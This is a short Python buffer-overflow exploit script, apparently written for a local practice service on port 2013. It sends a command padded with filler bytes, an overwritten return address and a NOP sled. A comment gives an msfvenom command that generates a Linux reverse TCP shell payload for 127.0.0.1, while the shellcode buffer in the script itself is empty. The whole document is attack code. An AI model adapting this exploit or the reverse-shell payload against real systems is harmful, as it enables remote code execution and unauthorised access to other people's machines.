import socket

# Make basic socket connection
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect( ("localhost", 2013) )

banner = sock.recv(1024)
print(banner)

data = b"INC " + b"A"*28

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4000 -f raw -o reverse.raw
buf =  b""

nopsled = b"\x90" * 20
payload = data
payload += b"\x4d\x22\x35\x66" + nopsled + buf
sock.send( payload  )

print( sock.recv(1024) )

# Send payload
sock.send("EXIT\r\n".encode())
res = sock.recv(2000)
print(res.decode())
